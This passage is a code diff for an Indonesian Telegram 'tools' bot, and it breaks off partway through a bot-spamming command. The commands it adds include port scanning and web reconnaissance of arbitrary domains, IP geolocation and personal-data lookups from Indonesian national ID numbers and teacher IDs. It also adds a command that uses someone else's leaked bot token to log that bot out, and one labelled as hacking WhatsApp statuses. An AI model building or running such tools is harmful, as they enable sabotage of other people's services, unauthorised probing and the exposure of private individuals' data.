+                    f"🗺️ Google Maps: https://maps.google.com/?q={data.get('lat')},{data.get('lon')}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text("❌ Gagal melacak IP", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_port_scan(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍𝐍𝐄𝐑\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/portscan google.com"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    domain = args[0].strip().replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
+    update.message.reply_text(format_loading("Scanning Port"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        result = tool_port_scanner(domain)
+        if result:
+            if result['open_ports']:
+                ports_text = "\n".join([f"🔓 {p['port']} ({p['name']})" for p in result['open_ports']])
+                update.message.reply_text(
+                    format_success(
+                        "𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                        f"🌍 Target: `{domain}`\n"
+                        f"📌 IP: `{result['ip']}`\n"
+                        f"🔓 Port terbuka:\n{ports_text}"
+                    ),
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            else:
+                update.message.reply_text(
+                    format_success(
+                        "𝐏𝐎𝐑𝐓 𝐒𝐂𝐀𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                        f"🌍 Target: `{domain}`\n"
+                        f"📌 IP: `{result['ip']}`\n"
+                        f"❌ Tidak ada port terbuka"
+                    ),
+                    parse_mode=ParseMode.MARKDOWN
+                )
+        else:
+            update.message.reply_text("❌ Gagal scan port", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_nik_parse(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐍𝐈𝐊 𝐂𝐇𝐄𝐂𝐊𝐄𝐑\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/nikparse 3307110101990001"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    nik = args[0].strip()
+    if not nik.isdigit() or len(nik) != 16:
+        update.message.reply_text("❌ NIK harus 16 digit angka!", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_text(format_loading("Mengecek NIK"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        url = f"https://api.nexray.eu.cc/tools/nikparse?nik={nik}"
+        resp = requests.get(url, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            result = data.get('result', {})
+            update.message.reply_text(
+                format_success(
+                    "𝐍𝐈𝐊 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"📌 NIK: `{nik}`\n"
+                    f"👤 Gender: {result.get('kelamin', 'N/A')}\n"
+                    f"📅 Lahir: {result.get('lahir_lengkap', 'N/A')}\n"
+                    f"📍 Provinsi: {result.get('provinsi', {}).get('nama', 'N/A')}\n"
+                    f"🏙️ Kab/Kota: {result.get('kotakab', {}).get('nama', 'N/A')}\n"
+                    f"📌 Kecamatan: {result.get('kecamatan', {}).get('nama', 'N/A')}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text(f"❌ NIK `{nik}` tidak ditemukan", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_cek_kodepos(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐊𝐎𝐃𝐄 𝐏𝐎𝐒\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/cekkodepos 16112"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    kode_pos = args[0].strip()
+    if not kode_pos.isdigit() or len(kode_pos) != 5:
+        update.message.reply_text("❌ Kode pos harus 5 digit!", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_text(format_loading("Mencari Kode Pos"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = tool_cek_kode_pos(kode_pos)
+        if data:
+            update.message.reply_text(
+                format_success(
+                    "𝐊𝐎𝐃𝐄 𝐏𝐎𝐒 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"📮 Kode Pos: `{kode_pos}`\n📍 Nama: {data.get('nama', 'N/A')}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text(f"❌ Kode pos `{kode_pos}` tidak ditemukan", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_cek_npsn(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐍𝐏𝐒𝐍\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/ceknpsn 40203594"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    npsn = args[0].strip()
+    if not npsn.isdigit() or len(npsn) != 8:
+        update.message.reply_text("❌ NPSN harus 8 digit!", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_text(format_loading("Mencari NPSN"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = tool_cek_npsn(npsn)
+        if data:
+            update.message.reply_text(
+                format_success(
+                    "𝐍𝐏𝐒𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"🏫 Nama: {data.get('nama', 'N/A')}\n"
+                    f"📮 NPSN: {data.get('npsn', 'N/A')}\n"
+                    f"📍 Provinsi: {data.get('provinsi', 'N/A')}\n"
+                    f"🏙️ Kab/Kota: {data.get('kabupaten', 'N/A')}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text(f"❌ NPSN `{npsn}` tidak ditemukan", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_ff_uid(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐅𝐅 𝐔𝐈𝐃 𝐂𝐇𝐄𝐂𝐊𝐄𝐑\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/ffuid 10353221131"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    uid = args[0].strip()
+    if not uid.isdigit():
+        update.message.reply_text("❌ UID harus angka!", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_text(format_loading("Mengecek UID Free Fire"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = tool_freefire_checker(uid)
+        if data:
+            update.message.reply_text(
+                format_success(
+                    "𝐅𝐑𝐄𝐄 𝐅𝐈𝐑𝐄 𝐔𝐈𝐃 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"🆔 UID: `{data.get('uid', 'N/A')}`\n"
+                    f"👤 Nama: {data.get('name', 'N/A')}\n"
+                    f"📊 Level: {data.get('level', 'N/A')}\n"
+                    f"🌍 Region: {data.get('region', 'N/A')}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text(f"❌ UID `{uid}` tidak ditemukan", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_cek_roblox(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐑𝐎𝐁𝐋𝐎𝐗 𝐂𝐇𝐄𝐂𝐊𝐄𝐑\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/cekroblox Builderman"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    username = args[0].strip()
+    update.message.reply_text(format_loading("Mengecek Akun Roblox"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = tool_roblox_checker(username)
+        if data:
+            basic = data.get('basic', {})
+            update.message.reply_text(
+                format_success(
+                    "𝐑𝐎𝐁𝐋𝐎𝐗 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"🆔 ID: `{data.get('userId', 'N/A')}`\n"
+                    f"👤 Username: {basic.get('name', 'N/A')}\n"
+                    f"📅 Created: {basic.get('created', 'N/A')}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text(f"❌ Username `{username}` tidak ditemukan", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_cek_dataguru(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐆𝐔𝐑𝐔\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/cekdataguru 1234567890123456"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    keyword = args[0].strip()
+    update.message.reply_text(format_loading("Mencari Data Guru"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = tool_cek_gtk(keyword)
+        if data:
+            update.message.reply_text(
+                format_success(
+                    "𝐃𝐀𝐓𝐀 𝐆𝐔𝐑𝐔 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"👤 Nama: {data.get('nama', 'N/A')}\n"
+                    f"📮 NUPTK: {data.get('nuptk', 'N/A')}\n"
+                    f"🏫 Sekolah: {data.get('sekolah', {}).get('nama', 'N/A')}\n"
+                    f"📍 Provinsi: {data.get('sekolah', {}).get('m_propinsi', {}).get('keterangan', 'N/A')}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text(f"❌ Data tidak ditemukan untuk `{keyword}`", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_cek_imei(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐈𝐌𝐄𝐈\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/cekimei 353911112345678"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    imei = args[0].strip()
+    if not imei.isdigit() or len(imei) < 14 or len(imei) > 17:
+        update.message.reply_text("❌ IMEI harus 14-17 digit!", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_text(format_loading("Mengecek IMEI"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = tool_cek_imei(imei)
+        if data:
+            update.message.reply_text(
+                format_success(
+                    "𝐈𝐌𝐄𝐈 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"📌 IMEI: `{imei}`\n"
+                    f"📱 Model: {data.get('Item1', 'N/A')}\n"
+                    f"🏷️ Brand: {data.get('Item3', 'N/A')}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text(f"❌ IMEI `{imei}` tidak ditemukan", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_cek_phising(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐋𝐈𝐍𝐊 𝐏𝐇𝐈𝐒𝐈𝐍𝐆\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/cekphising https://example.com"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    url = args[0].strip()
+    if not url.startswith('http'):
+        url = 'https://' + url
+    
+    update.message.reply_text(format_loading("Mengecek URL Phising"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = tool_web_phising_checker(url)
+        if data:
+            status = "⚠️ Terdeteksi PHISING!" if data.get('is_phishing') else "✅ Aman"
+            update.message.reply_text(
+                format_success(
+                    "𝐂𝐄𝐊 𝐋𝐈𝐍𝐊 𝐏𝐇𝐈𝐒𝐈𝐍𝐆 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"🔗 URL: {url[:60]}...\n"
+                    f"📌 Status: {status}\n"
+                    f"🛡️ Malware: {'⚠️ Terdeteksi' if data.get('contains_malware') else '✅ Aman'}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text("❌ Gagal mengecek URL", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_web_recon(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐖𝐄𝐁 𝐑𝐄𝐂𝐎𝐍𝐍𝐀𝐈𝐒𝐒𝐀𝐍𝐂𝐄\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/webrecon google.com"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    domain = args[0].strip().replace('http://', '').replace('https://', '').replace('www.', '').split('/')[0]
+    update.message.reply_text(format_loading("Melakukan Web Reconnaissance"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = tool_web_recon(domain)
+        if data:
+            sub_text = "\n".join(data['subdomains'][:10]) if data['subdomains'] else "Tidak ada subdomain"
+            update.message.reply_text(
+                format_success(
+                    "𝐖𝐄𝐁 𝐑𝐄𝐂𝐎𝐍 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"🌍 Domain: `{data['domain']}`\n"
+                    f"📌 IP: `{data['ip']}`\n"
+                    f"🔍 Subdomain: {data['total_subs']} ditemukan\n"
+                    f"🔌 Port terbuka: {', '.join(map(str, data['open_ports'])) if data['open_ports'] else 'Tidak ada'}\n\n"
+                    f"📋 *Subdomain sample:*\n{sub_text}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text(f"❌ Gagal reconnaissance untuk `{domain}`", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_shortener_url(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐋𝐈𝐍𝐊 𝐒𝐇𝐎𝐑𝐓𝐄𝐍𝐄𝐑\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/shortenerurl https://www.tokopedia.com"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    url = args[0].strip()
+    if not url.startswith('http'):
+        url = 'https://' + url
+    
+    update.message.reply_text(format_loading("Memendekkan URL"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        result = tool_link_shortener(url)
+        if result:
+            update.message.reply_text(
+                format_success(
+                    "𝐋𝐈𝐍𝐊 𝐒𝐇𝐎𝐑𝐓𝐄𝐍𝐄𝐑 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"🔗 URL Pendek: {result}\n📎 URL Asli: {url[:60]}..."
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text("❌ Gagal memendekkan URL", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_cek_resi(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if len(args) < 2:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐑𝐄𝐒𝐈\n"
+                f"𝙁𝙤𝙧𝙢𝙖𝙩:\n"
+                f"/cekresi kurir nomorresi\n\n"
+                f"Kurir: jne, jnt, sicepat, anteraja, pos, tiki, shopee\n"
+                f"Contoh: /cekresi jne 1234567890"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    courier = args[0].strip().lower()
+    awb = args[1].strip()
+    
+    update.message.reply_text(format_loading("Mencari Resi"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        data = tool_cek_resi(courier, awb)
+        if data:
+            history = data.get('history', [])
+            history_text = ""
+            for h in history[-5:]:
+                history_text += f"📅 {h.get('date', '')} → {h.get('desc', '')}\n"
+            
+            update.message.reply_text(
+                format_success(
+                    "𝐂𝐄𝐊 𝐑𝐄𝐒𝐈 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                    f"📮 Resi: `{data.get('awb')}`\n"
+                    f"📦 Kurir: {data.get('courier', '').upper()}\n"
+                    f"📌 Status: {data.get('status')}\n\n"
+                    f"📋 *Riwayat:*\n{history_text or 'Belum ada riwayat'}"
+                ),
+                parse_mode=ParseMode.MARKDOWN
+            )
+        else:
+            update.message.reply_text(f"❌ Resi `{awb}` tidak ditemukan", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_lapor_bug(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_photo(
+        photo=IMAGE,
+        caption=(
+            f"𝙏𝙊𝙊𝙇𝙎: 𝐋𝐀𝐏𝐎𝐑 𝐁𝐔𝐆\n"
+            f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
+            f"𝙇𝙖𝙥𝙤𝙧𝙠𝙖𝙣 𝙗𝙪𝙜 𝙠𝙚 𝙖𝙙𝙢𝙞𝙣:\n"
+            f"https://wa.me/+6283832110509"
+        ),
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+ def cmd_foto_tourl(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_photo(
+        photo=IMAGE,
+        caption=(
+            f"𝙏𝙊𝙊𝙇𝙎: 𝐅𝐎𝐓𝐎/𝐕𝐈𝐃𝐄𝐎 𝐓𝐎 𝐔𝐑𝐋\n"
+            f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+            f"Kirim file foto/video (max 200MB)"
+        ),
+        parse_mode=ParseMode.MARKDOWN
+    )
+    context.user_data['state'] = 'upload_photo'
+
+ def cmd_file_tourl(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_photo(
+        photo=IMAGE,
+        caption=(
+            f"𝙏𝙊𝙊𝙇𝙎: 𝐅𝐈𝐋𝐄 𝐓𝐎 𝐔𝐑𝐋\n"
+            f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+            f"Kirim file (max 10GB)"
+        ),
+        parse_mode=ParseMode.MARKDOWN
+    )
+    context.user_data['state'] = 'upload_file'
+
+ def cmd_hack_status_wa(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    update.message.reply_photo(
+        photo=IMAGE,
+        caption=(
+            f"𝙏𝙊𝙊𝙇𝙎: 𝐇𝐀𝐂𝐊 𝐒𝐓𝐀𝐓𝐔𝐒 𝐖𝐀\n"
+            f"𝘿𝙀𝙑𝙀𝙇𝙊𝙋: 𝐑𝐮𝐥𝐥𝐳𝐳𝐳𝟎𝟔\n\n"
+            f"𝙋𝙖𝙨𝙩𝙞𝙠𝙖𝙣 𝙒𝙝𝙖𝙩𝙨𝘼𝙥𝙥 𝙩𝙚𝙧𝙞𝙣𝙨𝙩𝙖𝙡𝙡\n"
+            f"𝙙𝙖𝙣 𝙨𝙪𝙙𝙖𝙝 𝙢𝙚𝙢𝙗𝙪𝙠𝙖 𝙨𝙩𝙖𝙩𝙪𝙨.\n\n"
+            f"𝙃𝙖𝙨𝙞𝙡 𝙖𝙠𝙖𝙣 𝙙𝙞𝙨𝙞𝙢𝙥𝙖𝙣 𝙙𝙞 𝙛𝙤𝙡𝙙𝙚𝙧 Status_WA"
+        ),
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+ def cmd_kill_bottele(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐊𝐈𝐋𝐋 𝐁𝐎𝐓 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/killbottele 1234567890:ABCdef"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    token = args[0].strip()
+    update.message.reply_text(format_loading("Membunuh Bot Telegram"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        url = f'https://api.telegram.org/bot{token}/logOut'
+        resp = requests.get(url, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                update.message.reply_text(
+                    format_success("𝐊𝐈𝐋𝐋 𝐁𝐎𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅", "✅ Bot berhasil dimatikan!"),
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            else:
+                update.message.reply_text("❌ Token bot tidak valid", parse_mode=ParseMode.MARKDOWN)
+        else:
+            update.message.reply_text("❌ Gagal mematikan bot", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_cek_infobot(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐂𝐄𝐊 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/cekinfobot 1234567890:ABCdef"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    token = args[0].strip()
+    update.message.reply_text(format_loading("Mengambil Info Bot"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        url = f'https://api.telegram.org/bot{token}/getMe'
+        resp = requests.get(url, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                result = data.get('result', {})
+                update.message.reply_text(
+                    format_success(
+                        "𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                        f"🆔 ID: `{result.get('id')}`\n"
+                        f"👤 Nama: {result.get('first_name')}\n"
+                        f"🔗 Username: @{result.get('username')}"
+                    ),
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            else:
+                update.message.reply_text("❌ Token bot tidak valid", parse_mode=ParseMode.MARKDOWN)
+        else:
+            update.message.reply_text("❌ Gagal mengambil info bot", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_get_id_chat(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if not args:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
+                f"𝙏𝙊𝙊𝙇𝙎: 𝐆𝐄𝐓 𝐈𝐃 𝐂𝐇𝐀𝐓\n"
+                f"𝙈𝙖𝙨𝙪𝙠𝙠𝙖𝙣:\n"
+                f"/getidchatbot 1234567890:ABCdef"
+            ),
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    token = args[0].strip()
+    update.message.reply_text(format_loading("Mengambil ID Chat Bot"), parse_mode=ParseMode.MARKDOWN)
+    
+    try:
+        url = f'https://api.telegram.org/bot{token}/getMe'
+        resp = requests.get(url, timeout=10)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('ok'):
+                result = data.get('result', {})
+                update.message.reply_text(
+                    format_success(
+                        "𝐆𝐄𝐓 𝐈𝐃 𝐂𝐇𝐀𝐓 𝐒𝐄𝐋𝐄𝐒𝐀𝐈✅",
+                        f"🆔 Bot ID: `{result.get('id')}`\n"
+                        f"👤 Nama: {result.get('first_name')}\n"
+                        f"🔗 Username: @{result.get('username')}"
+                    ),
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            else:
+                update.message.reply_text("❌ Token bot tidak valid", parse_mode=ParseMode.MARKDOWN)
+        else:
+            update.message.reply_text("❌ Gagal mengambil ID bot", parse_mode=ParseMode.MARKDOWN)
+    except Exception as e:
+        update.message.reply_text(format_error(str(e)), parse_mode=ParseMode.MARKDOWN)
+
+ def cmd_spam_bottele(self, update, context):
+    user_id = str(update.effective_user.id)
+    if not self.is_verified(user_id):
+        update.message.reply_text("❌ *Akses Ditolak!*", parse_mode=ParseMode.MARKDOWN)
+        return
+    
+    args = context.args
+    if len(args) < 3:
+        update.message.reply_photo(
+            photo=IMAGE,
+            caption=(
